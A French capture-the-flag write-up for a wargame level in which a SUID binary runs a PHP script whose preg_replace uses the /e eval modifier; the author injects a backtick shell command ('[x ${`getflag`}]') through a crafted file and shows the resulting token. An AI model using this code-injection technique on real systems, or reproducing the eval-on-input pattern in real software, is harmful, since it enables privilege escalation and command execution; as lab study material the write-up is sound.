```bash
$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

On a deux fichiers, `level06` et `level06.php`. Le premier est un exécutable avec le bit SUID activé, et le second est un script PHP.

```bash
$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

Le script PHP est exécuté par le binaire `level06`, et il semble qu'il y ait un problème avec la fonction `file_get_contents()`.

```bash
$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Le script php un peu mieux formaté:

```bash
#!/usr/bin/php
<?php
// Remplace les '.' par ' x ' et les '@' par ' y'
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

// Lit le contenu du fichier passé en paramètre, remplace les '[x ...]' par 'y(...)', les '[' par '(' et les ']' par ')'
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

// Ca on connait
$r = x($argv[1], $argv[2]);
print $r;
?>
```

En creusant un peu je remarque le `/e` dans la fonction `preg_replace()`. (bien evidemment ca n'existe plus dans les versions recentes de PHP)
Cela signifie que le second argument est évalué comme du code PHP. Cela signifie que si on arrive à injecter du code PHP dans le fichier passé en paramètre, on pourra l'exécuter.

Je concocte donc un fichier qui exécute `getflag` en PHP en l'entourant de `[x ...]` pour que le script le remplace par `y(...)`, et je l'exécute.

```bash
$ echo '[x ${`getflag`}]' > /tmp/flag06
$ ./level06 /tmp/flag06
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

Et voila :)